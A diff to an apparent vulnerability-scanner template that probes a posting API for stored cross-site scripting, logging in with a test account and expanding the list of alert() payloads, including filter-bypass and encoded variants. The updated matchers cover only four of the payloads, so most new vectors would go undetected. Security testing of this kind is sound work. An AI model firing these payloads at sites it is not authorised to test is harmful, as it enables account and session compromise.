@@ -18,27 +18,53 @@ http:
         POST /api/login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
-        
+
         {"user_id":"alice","password":"alice"}
-        
+
       - |
         POST /api/posts HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
         Authorization: Bearer {{token}}
-        
+
         {"content":"{{payload}}_{{rand_str}}"}
-        
+
       - |
         GET /api/posts HTTP/1.1
         Host: {{Hostname}}
 
     payloads:
       payload:
+        # Basic XSS
         - "<script>alert('XSS')</script>"
         - "<img src=x onerror=alert('XSS')>"
         - "<svg onload=alert('XSS')>"
         - "<iframe src='javascript:alert(\"XSS\")'>"
+        # Event handlers
+        - "<body onload=alert('XSS')>"
+        - "<input onfocus=alert('XSS') autofocus>"
+        - "<select onfocus=alert('XSS') autofocus>"
+        - "<textarea onfocus=alert('XSS') autofocus>"
+        - "<marquee onstart=alert('XSS')>"
+        # HTML5 vectors
+        - "<video src=x onerror=alert('XSS')>"
+        - "<audio src=x onerror=alert('XSS')>"
+        - "<details open ontoggle=alert('XSS')>"
+        # Encoded payloads
+        - "<script>\u0061lert('XSS')</script>"
+        - "<script>\x61lert('XSS')</script>"
+        - "<IMG SRC=javascript:alert('XSS')>"
+        - "<IMG SRC=JaVaScRiPt:alert('XSS')>"
+        # Filter bypass
+        - "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+        - "<img src=x on<x>error=alert('XSS')>"
+        - "<svg><script>alert('XSS')</script></svg>"
+        # Data URI
+        - "<img src='data:text/html,<script>alert(1)</script>'>"
+        - "<object data='data:text/html,<script>alert(1)</script>'>"
+        # With hashtags (SNS context)
+        - "#test<script>alert('XSS')</script>"
+        - "@user<img src=x onerror=alert('XSS')>"
 
     extractors:
       - type: regex
@@ -56,7 +82,11 @@ http:
         internal: true
 
     matchers:
-      - type: word
-        words:
-          - "{{payload}}_{{rand_str}}"
+      - type: regex
+        regex:
+          - "<script>alert\\('XSS'\\)</script>_[a-zA-Z0-9]{6}"
+          - "<img src=x onerror=alert\\('XSS'\\)>_[a-zA-Z0-9]{6}"
+          - "<svg onload=alert\\('XSS'\\)>_[a-zA-Z0-9]{6}"
+          - "<iframe src='javascript:alert\\(\"XSS\"\\)'_[a-zA-Z0-9]{6}"
+        condition: or
         part: body_3
